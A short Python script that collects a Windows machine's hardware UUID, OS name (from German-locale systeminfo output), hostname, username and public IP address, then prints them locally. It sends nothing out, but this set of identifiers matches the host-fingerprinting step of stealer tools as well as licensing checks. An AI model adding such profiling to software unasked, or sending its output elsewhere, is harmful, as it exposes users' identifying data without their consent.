import subprocess
import requests

def get_hwid():
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
        return hwid
    except Exception as error:
        return f"Error: {str(error)}"

def get_os():
    try:
        output = subprocess.check_output("systeminfo", shell=True, encoding="utf-8", errors="ignore")
        for line in output.split("\n"):
            if "Betriebssystemname" in line:
                return line.split(":", 1)[1].strip()
    except Exception as e:
        return f"Error: {str(e)}"

def get_hostname():
    try:
        return subprocess.check_output("hostname", shell=True, encoding="utf-8", errors="ignore").strip()
    except Exception as error:
        return f"Error: {str(error)}"
    
def get_username():
    try:
        return subprocess.check_output("whoami", shell=True, encoding="utf-8", errors="ignore").strip()
    except Exception as error:
        return f"Error: {str(error)}"

def get_ip():
    try:
        response = requests.get('https://api64.ipify.org?format=text', timeout=10)
        return response.text.strip()
    except Exception as error:
        return f"Error: {str(error)}"


if __name__ == "__main__":
    print(get_hwid())
    print(get_os())
    print(get_hostname())
    print(get_username())
    print(get_ip())